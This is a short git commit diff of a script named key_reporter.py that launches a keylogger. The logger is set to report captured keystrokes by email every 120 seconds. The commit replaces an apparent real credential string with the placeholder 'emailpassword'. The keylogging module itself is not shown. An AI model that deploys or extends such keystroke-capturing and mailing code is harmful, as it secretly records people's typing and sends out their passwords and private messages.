ee7111e85dea59ef353f92cfa5e0a387740b734d
Paulo Matos <pauloclmatos@gmail.com>
2021-11-16 10:53:51 +0000

    Update key_reporter.py

--- key_reporter.py
+++ key_reporter.py
@@ -3,7 +3,7 @@
 import keylogger
 
 try:
-    logger = keylogger.Keylogger(120,"pauloclmatos@gmail.com", "C4B77E61D94856CDE0147B27C100ACFAC09FE20D8D882043EE5E9554855D8342")
+    logger = keylogger.Keylogger(120,"pauloclmatos@gmail.com", "emailpassword")
     logger.start()
 except KeyboardInterrupt:
     print()
